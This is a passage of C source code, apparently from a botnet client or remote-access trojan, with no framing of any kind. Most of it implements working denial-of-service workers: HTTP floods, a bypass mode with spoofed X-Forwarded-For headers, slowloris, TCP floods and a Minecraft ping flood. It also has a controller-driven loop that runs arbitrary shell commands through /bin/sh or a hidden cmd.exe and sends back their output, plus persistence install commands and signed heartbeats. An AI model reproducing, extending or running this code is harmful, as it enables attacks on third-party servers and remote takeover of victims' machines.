        int we=WSAGetLastError();if(we!=WSAEWOULDBLOCK&&we!=WSAEINPROGRESS){CLOSE_SOCK(s);return INVALID_SOCK;}
        fd_set wf,ef;FD_ZERO(&wf);FD_ZERO(&ef);FD_SET(s,&wf);FD_SET(s,&ef);
        struct timeval tv={timeout_ms/1000,(timeout_ms%1000)*1000};
        int r=select(0,NULL,&wf,&ef,&tv);if(r<=0){CLOSE_SOCK(s);return INVALID_SOCK;}
        if(FD_ISSET(s,&ef)){CLOSE_SOCK(s);return INVALID_SOCK;}
#else
        if(errno!=EINPROGRESS&&errno!=EWOULDBLOCK&&errno!=EAGAIN){CLOSE_SOCK(s);return INVALID_SOCK;}
        struct pollfd pf={s,POLLOUT,0};int r=poll(&pf,1,timeout_ms);
        if(r<=0){CLOSE_SOCK(s);return INVALID_SOCK;}
        int err=0;socklen_t el=sizeof(err);
        if(getsockopt(s,SOL_SOCKET,SO_ERROR,&err,&el)<0||err!=0){CLOSE_SOCK(s);return INVALID_SOCK;}
#endif
    }
#ifdef _WIN32
    u_long b=0;ioctlsocket(s,FIONBIO,&b);
    DWORD snd=DD_SND_TIMEOUT_MS;setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,(char*)&snd,sizeof(snd));
#else
    int fl2=fcntl(s,F_GETFL,0);fcntl(s,F_SETFL,fl2&~O_NONBLOCK);
    struct timeval snd={DD_SND_TIMEOUT_MS/1000,(DD_SND_TIMEOUT_MS%1000)*1000};
    setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&snd,sizeof(snd));
#endif
    return s;
}
static void dd_inc(int n){
#ifdef _WIN32
    InterlockedExchangeAdd((volatile LONG*)&g_dd.total_packets,(LONG)n);
#else
    __sync_fetch_and_add(&g_dd.total_packets,n);
#endif
}
static int dd_stop(void){
#ifdef _WIN32
    return InterlockedCompareExchange((volatile LONG*)&g_dd.stop_flag,1,1)==1;
#else
    return g_dd.stop_flag==1;
#endif
}
static void dd_set_stop(int v){
#ifdef _WIN32
    InterlockedExchange((volatile LONG*)&g_dd.stop_flag,(LONG)v);
#else
    g_dd.stop_flag=v;
#endif
}
static int dd_result_test_set(void){
#ifdef _WIN32
    return InterlockedExchange((volatile LONG*)&g_dd.result_sent,1)==0;
#else
    return __sync_lock_test_and_set(&g_dd.result_sent,1)==0;
#endif
}
static void dd_result_clear(void){
#ifdef _WIN32
    InterlockedExchange((volatile LONG*)&g_dd.result_sent,0);
#else
    g_dd.result_sent=0;
#endif
}

static void dd_worker_http_flood(void){
    char host[256], path[512]; int port, delay_ms;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    strncpy(path, g_dd.target_path, sizeof(path)-1); path[sizeof(path)-1]=0;
    port = g_dd.target_port; delay_ms = g_dd.delay_ms;
    DD_UNLOCK();

    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
    char req[1024];const char *p=path[0]?path:"/";
    snprintf(req,sizeof(req),"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",p,host);
    int rlen=(int)strlen(req);
    while(!dd_stop()){
        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
        if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
        if(send(s,req,rlen,0)>0)dd_inc(1);
        CLOSE_SOCK(s);
        if(delay_ms>0)SLEEP_MS(delay_ms);
    }
}
static void dd_worker_http_burst(void){
    char host[256], path[512]; int port, delay_ms;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    strncpy(path, g_dd.target_path, sizeof(path)-1); path[sizeof(path)-1]=0;
    port = g_dd.target_port; delay_ms = g_dd.delay_ms;
    DD_UNLOCK();

    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
    char req[1024];const char *p=path[0]?path:"/";
    snprintf(req,sizeof(req),"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",p,host);
    int rlen=(int)strlen(req);int burst=64;
    while(!dd_stop()){
        for(int i=0;i<burst&&!dd_stop();i++){
            sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
            if(s==INVALID_SOCK)continue;
            if(send(s,req,rlen,0)>0)dd_inc(1);
            CLOSE_SOCK(s);
        }
        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(10);
    }
}
static void dd_worker_http_bypass(void){
    char host[256]; int port, delay_ms;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    port = g_dd.target_port; delay_ms = g_dd.delay_ms;
    DD_UNLOCK();

    unsigned int seed = dd_seed_init();
    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
    const char *uas[]={"Mozilla/5.0 (Windows NT 10.0)","Mozilla/5.0 (Macintosh)","Mozilla/5.0 (X11; Linux x86_64)"};
    const char *paths[]={"/","/index.html","/api","/login","/wp-admin","/?id=1"};
    while(!dd_stop()){
        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
        if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
        char req[1024];int ri=dd_rand(&seed)%3,pi=dd_rand(&seed)%6;
        snprintf(req,sizeof(req),"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nX-Forwarded-For: %d.%d.%d.%d\r\nAccept: text/html\r\nConnection: close\r\n\r\n",
            paths[pi],host,uas[ri],(dd_rand(&seed)%255)+1,(dd_rand(&seed)%255)+1,(dd_rand(&seed)%255)+1,(dd_rand(&seed)%255)+1);
        if(send(s,req,strlen(req),0)>0)dd_inc(1);
        SLEEP_MS(dd_rand(&seed)%100);
        CLOSE_SOCK(s);
        if(delay_ms>0)SLEEP_MS(delay_ms);
    }
}
static void dd_worker_http_slowloris(void){
    char host[256]; int port;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    port = g_dd.target_port;
    DD_UNLOCK();

    unsigned int seed = dd_seed_init();
    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
    while(!dd_stop()){
        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
        if(s==INVALID_SOCK){SLEEP_MS(100);continue;}
        char line[128];int n=snprintf(line,sizeof(line),"GET /%d HTTP/1.1\r\nHost: %s\r\n",dd_rand(&seed)&0xFFFF,host);
        if(send(s,line,n,0)>0)dd_inc(1);
        for(int i=0;i<20&&!dd_stop();i++){
            char hdr[]="X-a: b\r\n";
            if(send(s,hdr,1,0)<=0)break;
            dd_inc(1);
            SLEEP_MS(500);
        }
        CLOSE_SOCK(s);
    }
}
static void dd_worker_tcp_flood(void){
    char host[256]; int port, pktsize, delay_ms;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    port = g_dd.target_port; pktsize = g_dd.pktsize; delay_ms = g_dd.delay_ms;
    DD_UNLOCK();

    unsigned int seed = dd_seed_init();
    char *p=(char*)malloc(pktsize);if(!p)return;
    for(int i=0;i<pktsize;i++)p[i]=(char)(dd_rand(&seed)&0xFF);
    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0){free(p);return;}
    while(!dd_stop()){
        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
        if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
        if(send(s,p,pktsize,0)>0)dd_inc(1);
        CLOSE_SOCK(s);
        if(delay_ms>0)SLEEP_MS(delay_ms);
    }
    free(p);
}
static void dd_worker_tcp_burst(void){
    char host[256]; int port, pktsize, delay_ms;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    port = g_dd.target_port; pktsize = g_dd.pktsize; delay_ms = g_dd.delay_ms;
    DD_UNLOCK();

    unsigned int seed = dd_seed_init();
    char *p=(char*)malloc(pktsize);if(!p)return;
    for(int i=0;i<pktsize;i++)p[i]=(char)(dd_rand(&seed)&0xFF);
    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0){free(p);return;}
    int burst=64;
    while(!dd_stop()){
        for(int i=0;i<burst&&!dd_stop();i++){
            sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
            if(s==INVALID_SOCK)continue;
            if(send(s,p,pktsize,0)>0)dd_inc(1);
            CLOSE_SOCK(s);
        }
        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(10);
    }
    free(p);
}
static void dd_worker_tcp_slowloris(void){
    char host[256]; int port;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    port = g_dd.target_port;
    DD_UNLOCK();

    unsigned int seed = dd_seed_init();
    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
    while(!dd_stop()){
        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
        if(s==INVALID_SOCK){SLEEP_MS(100);continue;}
        for(int i=0;i<20&&!dd_stop();i++){
            char b=(char)(dd_rand(&seed)&0xFF);
            if(send(s,&b,1,0)<=0)break;
            dd_inc(1);
            SLEEP_MS(500);
        }
        CLOSE_SOCK(s);
    }
}
static void dd_worker_mc(void){
    char host[256]; int port, delay_ms;
    DD_LOCK();
    strncpy(host, g_dd.target_host, sizeof(host)-1); host[sizeof(host)-1]=0;
    port = g_dd.target_port; delay_ms = g_dd.delay_ms;
    DD_UNLOCK();

    struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
    sock_t s=socket(AF_INET,SOCK_DGRAM,0);if(s==INVALID_SOCK)return;
#ifdef _WIN32
    DWORD snd=DD_SND_TIMEOUT_MS;setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,(char*)&snd,sizeof(snd));
#else
    struct timeval snd={DD_SND_TIMEOUT_MS/1000,(DD_SND_TIMEOUT_MS%1000)*1000};
    setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&snd,sizeof(snd));
#endif
    int hl=(int)strlen(host);if(hl>200)hl=200;
    unsigned short pb=htons((unsigned short)port);
    unsigned char hb[512];int bp=0;
    hb[bp++]=0;hb[bp++]=0x7F;hb[bp++]=(unsigned char)hl;memcpy(hb+bp,host,hl);bp+=hl;
    hb[bp++]=(unsigned char)(pb>>8);hb[bp++]=(unsigned char)(pb&0xFF);hb[bp++]=1;
    unsigned char hs[600];int p=0;
    if(bp<128)hs[p++]=(unsigned char)bp;
    else{hs[p++]=(unsigned char)((bp&0x7F)|0x80);hs[p++]=(unsigned char)((bp>>7)&0x7F);}
    memcpy(hs+p,hb,bp);p+=bp;
    unsigned char rq[2]={1,0};
    while(!dd_stop()){
        if(sendto(s,(const char*)hs,p,0,(struct sockaddr*)&srv,sizeof(srv))>0)dd_inc(1);
        if(sendto(s,(const char*)rq,sizeof(rq),0,(struct sockaddr*)&srv,sizeof(srv))>0)dd_inc(1);
        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(5);
    }
    CLOSE_SOCK(s);
}

#ifdef _WIN32
static DWORD WINAPI dd_thread_entry(LPVOID arg){
#else
static void *dd_thread_entry(void *arg){
#endif
    dd_method_t m=(dd_method_t)(uintptr_t)arg;
    switch(m){
        case DD_HTTP_FLOOD:dd_worker_http_flood();break;
        case DD_HTTP_BURST:dd_worker_http_burst();break;
        case DD_HTTP_BYPASS:dd_worker_http_bypass();break;
        case DD_HTTP_SLOWLORIS:dd_worker_http_slowloris();break;
        case DD_TCP_FLOOD:dd_worker_tcp_flood();break;
        case DD_TCP_BURST:dd_worker_tcp_burst();break;
        case DD_TCP_SLOWLORIS:dd_worker_tcp_slowloris();break;
        case DD_MC_PING:dd_worker_mc();break;
        default:break;
    }
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}
#ifdef _WIN32
static DWORD WINAPI dd_stats_entry(LPVOID arg){
#else
static void *dd_stats_entry(void *arg){
#endif
    (void)arg;
    char cid[CMD_ID_LEN+1];DD_LOCK();memcpy(cid,g_dd_cmd_id,CMD_ID_LEN);cid[CMD_ID_LEN]=0;DD_UNLOCK();
    int last=0;
    while(!dd_stop()){
        SLEEP_MS(2000);
        if(dd_stop())break;
        int tot=(int)g_dd.total_packets;
        int pps=(tot-last)/2;
        last=tot;
        char data[64];snprintf(data,sizeof(data),"pps=%d total=%d",pps,tot);
        send_out(cid,"stats",data,(int)strlen(data));
    }
    int tot=(int)g_dd.total_packets;
    char data[64];snprintf(data,sizeof(data),"pps=0 total=%d",tot);
    send_out(cid,"stats",data,(int)strlen(data));
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}
static void dd_supervisor_inner(void){
    int my_gen,my_dur;char my_cid[CMD_ID_LEN+1];
    DD_LOCK();my_gen=dd_gen_get();my_dur=g_dd.duration*1000;
    memcpy(my_cid,g_dd_cmd_id,CMD_ID_LEN);my_cid[CMD_ID_LEN]=0;DD_UNLOCK();
    int el=0;
    while(el<my_dur){if(dd_gen_get()!=my_gen)return;if(dd_stop())break;SLEEP_MS(200);el+=200;}
    
    DD_LOCK();
    if(dd_gen_get() != my_gen) { DD_UNLOCK(); return; }
    dd_set_stop(1);
    DD_UNLOCK();
    
    if(dd_result_test_set()){send_out(my_cid,"stdout","ddos finished",14);send_result(my_cid,0,0);}
}
#ifdef _WIN32
static DWORD WINAPI dd_supervisor_entry(LPVOID arg){(void)arg;dd_supervisor_inner();return 0;}
#else
static void *dd_supervisor_entry(void *arg){(void)arg;dd_supervisor_inner();return NULL;}
#endif

static void dd_finish_locked(const char *ext_cid,int send_res){
    DD_LOCK();
    int was=g_dd.active,my_gen=dd_gen_get(),n=g_dd.nworkers;
    THREAD_HANDLE workers[DDOS_THREADS_MAX];memcpy(workers,g_dd.workers,sizeof(THREAD_HANDLE)*n);
    THREAD_HANDLE stats=g_dd.stats_thr;
    char cid[CMD_ID_LEN+1];
    if(ext_cid){strncpy(cid,ext_cid,CMD_ID_LEN);cid[CMD_ID_LEN]=0;}
    else{memcpy(cid,g_dd_cmd_id,CMD_ID_LEN);cid[CMD_ID_LEN]=0;}
    if(was){dd_set_stop(1);g_dd.active=0;g_dd.nworkers=0;g_dd.stats_thr=0;}
    DD_UNLOCK();
    if(was){for(int i=0;i<n;i++)THREAD_JOIN(workers[i]);if(stats)THREAD_JOIN(stats);}
    if(send_res==0 && was){
        if(dd_result_test_set()){
            send_out(cid,"stdout","ddos stopped",12);
            send_result(cid,0,0);
        }
    }
    (void)my_gen;
}
static void dd_stop_from_cmd(const char *cid){
    DD_OP_LOCK();
    dd_finish_locked(cid,0);
    DD_OP_UNLOCK();
}

static int parse_int_strict(const char *js,const char *key,int def){
    int v=def;
    if(!json_get_int(js,key,&v))return def;
    return v;
}

static void dd_start(const char *cmd,const char *cmd_id){
    DD_OP_LOCK();
    const char *js=strchr(cmd,'{');if(!js){DD_OP_UNLOCK();send_result(cmd_id,-1,0);return;}
    char target[256]={0},method[32]={0};
    int pktsize=64,duration=60,delay_ms=0,threads=8;
    json_get_str(js,"target",target,sizeof(target));json_get_str(js,"method",method,sizeof(method));
    pktsize=parse_int_strict(js,"pktsize",64);
    duration=parse_int_strict(js,"duration",60);
    delay_ms=parse_int_strict(js,"delay_ms",0);
    threads=parse_int_strict(js,"threads",8);
    if(!target[0]||pktsize<1||pktsize>DDOS_PKTSIZE_MAX||duration<1||duration>DDOS_DURATION_MAX||
       delay_ms<0||delay_ms>DDOS_DELAY_MAX_MS||threads<1||threads>DDOS_THREADS_MAX){
        DD_OP_UNLOCK();send_result(cmd_id,-2,0);return;
    }
    dd_method_t m=DD_NONE;
    if(!strcmp(method,"http_flood"))m=DD_HTTP_FLOOD;
    else if(!strcmp(method,"http_burst"))m=DD_HTTP_BURST;
    else if(!strcmp(method,"http_bypass"))m=DD_HTTP_BYPASS;
    else if(!strcmp(method,"http_slowloris"))m=DD_HTTP_SLOWLORIS;
    else if(!strcmp(method,"tcp_flood"))m=DD_TCP_FLOOD;
    else if(!strcmp(method,"tcp_burst"))m=DD_TCP_BURST;
    else if(!strcmp(method,"tcp_slowloris"))m=DD_TCP_SLOWLORIS;
    else if(!strcmp(method,"minecraft_ping"))m=DD_MC_PING;
    else{DD_OP_UNLOCK();send_result(cmd_id,-3,0);return;}
    char host[256]={0},path[512]={0};int port=80;
    {const char *p=target;
     if(!strncmp(p,"http://",7)){p+=7;port=80;}
     else if(!strncmp(p,"https://",8)){p+=8;port=443;}
     int hi=0;while(*p&&*p!=':'&&*p!='/'&&hi<(int)sizeof(host)-1)host[hi++]=*p++;host[hi]=0;
     if(*p==':'){p++;port=atoi(p);while(*p&&*p!='/')p++;}
     if(*p=='/')strncpy(path,p,sizeof(path)-1);
     else if(m==DD_HTTP_FLOOD||m==DD_HTTP_BURST||m==DD_HTTP_BYPASS||m==DD_HTTP_SLOWLORIS)strcpy(path,"/");}
    if(!host[0]||port<=0||port>65535){DD_OP_UNLOCK();send_result(cmd_id,-2,0);return;}
    for(;;){DD_LOCK();int a=g_dd.active;DD_UNLOCK();if(!a)break;dd_finish_locked(NULL,-1);}
    DD_LOCK();
    memset(&g_dd,0,sizeof(g_dd));
    strncpy(g_dd.target_host,host,sizeof(g_dd.target_host)-1);
    strncpy(g_dd.target_path,path,sizeof(g_dd.target_path)-1);
    g_dd.target_port=port;g_dd.method=m;g_dd.pktsize=pktsize;
    g_dd.duration=duration;g_dd.delay_ms=delay_ms;g_dd.threads=threads;
    g_dd.active=1;dd_gen_next();dd_set_stop(0);dd_result_clear();
#ifdef _WIN32
    InterlockedExchange((volatile LONG*)&g_dd.total_packets,0);
#else
    g_dd.total_packets=0;
#endif
    strncpy(g_dd_cmd_id,cmd_id,CMD_ID_LEN);g_dd_cmd_id[CMD_ID_LEN]=0;
    int started=0;
    for(int i=0;i<threads;i++){
        THREAD_HANDLE h=0;
        THREAD_CREATE(h,dd_thread_entry,(void*)(uintptr_t)m);
        if(h)g_dd.workers[started++]=h;
    }
    g_dd.nworkers=started;
    if(started==0){g_dd.active=0;DD_UNLOCK();DD_OP_UNLOCK();send_result(cmd_id,-5,0);return;}
    THREAD_HANDLE sh=0;THREAD_CREATE(sh,dd_stats_entry,NULL);g_dd.stats_thr=sh;
    THREAD_HANDLE sup=0;THREAD_CREATE(sup,dd_supervisor_entry,NULL);
#ifdef _WIN32
    if(sup)CloseHandle(sup);
#else
    if(sup)pthread_detach(sup);
#endif
    DD_UNLOCK();
    DD_OP_UNLOCK();
    char msg[128];snprintf(msg,sizeof(msg),"ddos started %s -> %s:%d x%d",method,host,port,started);
    send_out(cmd_id,"stdout",msg,(int)strlen(msg));
}

/* exec */
#ifndef _WIN32
static int now_ms(void){struct timespec ts;clock_gettime(CLOCK_MONOTONIC,&ts);return (int)(ts.tv_sec*1000+ts.tv_nsec/1000000);}
static int drain(int fd,const char *cid,const char *stream){
    char b[OUT_CHUNK];
    while(1){
        ssize_t n=read(fd,b,sizeof(b));
        if(n>0){send_out(cid,stream,b,(int)n);continue;}
        if(n==0)return 1;
        if(errno==EAGAIN||errno==EWOULDBLOCK)return 0;
        if(errno==EINTR)continue;
        return 1;
    }
}
static void run_and_report_linux(const char *cmd,const char *cid){
    int op[2],ep[2];
    if(pipe(op)<0){send_out(cid,"stderr","pipe out",8);send_result(cid,-1,0);return;}
    if(pipe(ep)<0){close(op[0]);close(op[1]);send_out(cid,"stderr","pipe err",8);send_result(cid,-1,0);return;}
    pid_t pid=fork();
    if(pid<0){close(op[0]);close(op[1]);close(ep[0]);close(ep[1]);send_out(cid,"stderr","fork",4);send_result(cid,-1,0);return;}
    if(pid==0){dup2(op[1],1);dup2(ep[1],2);close(op[0]);close(op[1]);close(ep[0]);close(ep[1]);
        execl("/bin/sh","sh","-c",cmd,(char*)NULL);_exit(127);}
    close(op[1]);close(ep[1]);fcntl(op[0],F_SETFL,O_NONBLOCK);fcntl(ep[0],F_SETFL,O_NONBLOCK);
    struct pollfd pf[2];pf[0].fd=op[0];pf[0].events=POLLIN;pf[1].fd=ep[0];pf[1].events=POLLIN;
    int ao=1,ae=1,timed=0,start=now_ms();
    while(ao||ae){
        if(!CONN_ALIVE()){timed=1;kill(pid,SIGKILL);break;}
        if(now_ms()-start>=CMD_TIMEOUT_MS){
            timed=1;kill(pid,SIGKILL);
            if(ao)drain(op[0],cid,"stdout");
            if(ae)drain(ep[0],cid,"stderr");
            break;
        }
        int r=poll(pf,2,POLL_SLICE_MS);
        if(r<0){if(errno==EINTR)continue;break;}
        if(r==0)continue;
        if(ao){
            if(pf[0].revents&POLLIN){if(drain(op[0],cid,"stdout"))ao=0;}
            if(pf[0].revents&(POLLHUP|POLLERR|POLLNVAL)){if(drain(op[0],cid,"stdout"))ao=0;}
        }
        if(ae){
            if(pf[1].revents&POLLIN){if(drain(ep[0],cid,"stderr"))ae=0;}
            if(pf[1].revents&(POLLHUP|POLLERR|POLLNVAL)){if(drain(ep[0],cid,"stderr"))ae=0;}
        }
    }
    close(op[0]);close(ep[0]);
    int st=0;
    if(timed){
        int w=0;
        while(w<3000){pid_t r=waitpid(pid,&st,WNOHANG);if(r==pid)break;SLEEP_MS(50);w+=50;}
        if(w>=3000){
            kill(pid,SIGKILL);
            int reaped=0;int w2=0;
            while(w2<5000){pid_t r=waitpid(pid,&st,WNOHANG);if(r==pid){reaped=1;break;}SLEEP_MS(100);w2+=100;}
            int code=-1;
            if(reaped){
                if(WIFEXITED(st))code=WEXITSTATUS(st);
                else if(WIFSIGNALED(st))code=-WTERMSIG(st);
            }
            send_result(cid,code,1);
            return;
        }
    } else waitpid(pid,&st,0);
    int s2=0;waitpid(pid,&s2,WNOHANG);
    int code=-1;if(WIFEXITED(st))code=WEXITSTATUS(st);else if(WIFSIGNALED(st))code=-WTERMSIG(st);
    if(CONN_ALIVE())send_result(cid,code,timed);
}
#else
static void run_and_report_win(const char *cmd,const char *cid){
    SECURITY_ATTRIBUTES sa;sa.nLength=sizeof(sa);sa.bInheritHandle=TRUE;sa.lpSecurityDescriptor=NULL;
    HANDLE ord=NULL,owr=NULL,erd=NULL,ewr=NULL;
    if(!CreatePipe(&ord,&owr,&sa,0)||!CreatePipe(&erd,&ewr,&sa,0)){
        if(ord)CloseHandle(ord);if(owr)CloseHandle(owr);if(erd)CloseHandle(erd);if(ewr)CloseHandle(ewr);
        send_out(cid,"stderr","CreatePipe",11);send_result(cid,-1,0);return;}
    SetHandleInformation(ord,HANDLE_FLAG_INHERIT,0);SetHandleInformation(erd,HANDLE_FLAG_INHERIT,0);
    STARTUPINFOA si;PROCESS_INFORMATION pi;memset(&si,0,sizeof(si));memset(&pi,0,sizeof(pi));
    si.cb=sizeof(si);si.dwFlags=STARTF_USESTDHANDLES;si.hStdOutput=owr;si.hStdError=ewr;si.hStdInput=GetStdHandle(STD_INPUT_HANDLE);
    char cb[OUT_CHUNK];snprintf(cb,sizeof(cb),"cmd.exe /c %s",cmd);
    BOOL ok=CreateProcessA(NULL,cb,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    CloseHandle(owr);CloseHandle(ewr);
    if(!ok){CloseHandle(ord);CloseHandle(erd);send_out(cid,"stderr","CreateProcess",13);send_result(cid,-1,0);return;}
    int timed=0,ao=1,ae=1,eo=0,ee=0,pd=0;ULONGLONG st=GetTickCount64();
    while(ao||ae){
        if(!CONN_ALIVE()){TerminateProcess(pi.hProcess,1);break;}
        ULONGLONG el=GetTickCount64()-st;
        if(el>=CMD_TIMEOUT_MS&&!pd){timed=1;TerminateProcess(pi.hProcess,1);}
        if(ao){
            DWORD av=0;
            if(PeekNamedPipe(ord,NULL,0,NULL,&av,NULL)&&av>0){
                char b[OUT_CHUNK];DWORD tr=av>(DWORD)sizeof(b)?(DWORD)sizeof(b):av;DWORD got=0;
                if(ReadFile(ord,b,tr,&got,NULL)&&got>0)send_out(cid,"stdout",b,(int)got);
            }else{
                if(GetLastError()==ERROR_BROKEN_PIPE || WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0) eo=1;
            }
            if(eo){ao=0;CloseHandle(ord);ord=NULL;}
        }
        if(ae){
            DWORD av=0;
            if(PeekNamedPipe(erd,NULL,0,NULL,&av,NULL)&&av>0){
                char b[OUT_CHUNK];DWORD tr=av>(DWORD)sizeof(b)?(DWORD)sizeof(b):av;DWORD got=0;
                if(ReadFile(erd,b,tr,&got,NULL)&&got>0)send_out(cid,"stderr",b,(int)got);
            }else{
                if(GetLastError()==ERROR_BROKEN_PIPE || WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0) ee=1;
            }
            if(ee){ae=0;CloseHandle(erd);erd=NULL;}
        }
        if(WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0)pd=1;
        if(pd&&!ao&&!ae)break;
        SLEEP_MS(POLL_SLICE_MS);
    }
    if(ord)CloseHandle(ord);if(erd)CloseHandle(erd);
    DWORD code=0;WaitForSingleObject(pi.hProcess,2000);GetExitCodeProcess(pi.hProcess,&code);
    CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
    if(CONN_ALIVE())send_result(cid,(int)code,timed);
}
#endif

/* exec thread */
#ifdef _WIN32
static DWORD WINAPI exec_thread(LPVOID arg){
#else
static void *exec_thread(void *arg){
#endif
    (void)arg;
    while(1){
        Q_LOCK();
        while(!q_head&&!q_shutdown&&CONN_ALIVE())Q_WAIT();
        if(q_shutdown||!CONN_ALIVE()){Q_UNLOCK();break;}
        cmd_node *n=q_head;q_head=n->next;if(!q_head)q_tail=NULL;q_count--;
        Q_UNLOCK();
        if(n->cmd){
            if(!strcmp(n->cmd,"exit")){
                free(n->cmd); free(n);
                #ifdef _WIN32
                ExitProcess(0);
                #else
                _exit(0);
                #endif
            }
            send_ack(n->cmd_id);
            if(!strncmp(n->cmd,"ddos_start ",11))dd_start(n->cmd,n->cmd_id);
            else if(!strcmp(n->cmd,"ddos_stop"))dd_stop_from_cmd(n->cmd_id);
            else if(!strcmp(n->cmd,"install_persist")){
                char err[256]={0};int rc=do_install_persist(err,sizeof(err));
                if(rc==0){const char *ok="persist installed";send_out(n->cmd_id,"stdout",ok,(int)strlen(ok));send_result(n->cmd_id,0,0);}
                else{send_out(n->cmd_id,"stderr",err,(int)strlen(err));send_result(n->cmd_id,-1,0);}
            }
            else if(!strcmp(n->cmd,"uninstall_persist")){
                char err[256]={0};int rc=do_uninstall_persist(err,sizeof(err));
                if(rc==0){const char *ok="persist removed";send_out(n->cmd_id,"stdout",ok,(int)strlen(ok));send_result(n->cmd_id,0,0);}
                else{send_out(n->cmd_id,"stderr",err,(int)strlen(err));send_result(n->cmd_id,-1,0);}
            }
            else{
#ifdef _WIN32
                run_and_report_win(n->cmd,n->cmd_id);
#else
                run_and_report_linux(n->cmd,n->cmd_id);
#endif
            }
        }
        free(n->cmd);free(n);
    }
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}
static int enqueue_cmd(const char *cmd,const char *cid,int seq){
    cmd_node *n=(cmd_node*)malloc(sizeof(cmd_node));if(!n)return -1;
    n->cmd=strdup(cmd);if(!n->cmd){free(n);return -1;}
    strncpy(n->cmd_id,cid,CMD_ID_LEN);n->cmd_id[CMD_ID_LEN]=0;n->seq=seq;n->next=NULL;
    Q_LOCK();
    if(q_count>=CMD_QUEUE_MAX){Q_UNLOCK();free(n->cmd);free(n);return -1;}
    if(q_tail)q_tail->next=n;else q_head=n;q_tail=n;q_count++;Q_SIGNAL();Q_UNLOCK();
    return 0;
}
static void clear_queue(void){
    Q_LOCK();cmd_node *p=q_head;
    while(p){cmd_node *n=p->next;free(p->cmd);free(p);p=n;}
    q_head=q_tail=NULL;q_count=0;Q_SIGNAL();Q_UNLOCK();
}

/* ping */
#ifdef _WIN32
DWORD WINAPI ping_thread(LPVOID arg){
#else
void *ping_thread(void *arg){
#endif
    (void)arg;
    while(CONN_ALIVE()){
        for(int i=0;i<PING_MS/100&&CONN_ALIVE();i++)SLEEP_MS(100);
        if(!CONN_ALIVE())break;
        int ts=(int)time(NULL);
        char nonce[17];gen_nonce(nonce,sizeof(nonce));
        char sig[65];sign_frame(g_id,ts,nonce,"PING","","","",sig);
        char frame[256];
        snprintf(frame,sizeof(frame),"{\"type\":\"PING\",\"id\":\"%s\",\"ts\":%d,\"nonce\":\"%s\",\"hmac\":\"%s\"}",
            g_id,ts,nonce,sig);
        if(send_frame_raw(frame)<0)break;
    }
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

static void make_id(char *out,int max){
    unsigned char rnd[16];int ok=0;
#ifdef _WIN32
    HCRYPTPROV prov;
    if(CryptAcquireContext(&prov,NULL,NULL,PROV_RSA_FULL,CRYPT_VERIFYCONTEXT)){
        if(CryptGenRandom(prov,16,rnd))ok=1;
        CryptReleaseContext(prov,0);
    }
#else
    FILE *f=fopen("/dev/urandom","rb");
    if(f){if(fread(rnd,1,16,f)==16)ok=1;fclose(f);}
#endif
    if(!ok){
        unsigned int seed=dd_seed_init();
        for(int i=0;i<16;i++)rnd[i]=(unsigned char)(dd_rand(&seed)&0xFF);
    }
    static const char *hx="0123456789abcdef";
    char hex[33];
    for(int i=0;i<16;i++){hex[i*2]=hx[rnd[i]>>4];hex[i*2+1]=hx[rnd[i]&0xF];}
    hex[32]=0;
    snprintf(out,max,"%.8s-%.4s-%.4s-%.4s-%.12s",hex,hex+8,hex+12,hex+16,hex+20);
}

static int backoff_ms(int attempt){
    long long d=RECONNECT_BASE_MS;
    for(int i=0;i<attempt&&d<RECONNECT_MAX_MS;i++){d*=2;if(d>RECONNECT_MAX_MS){d=RECONNECT_MAX_MS;break;}}
    unsigned int seed=dd_seed_init();
    double j=(double)(dd_rand(&seed)%1000)/1000.0;
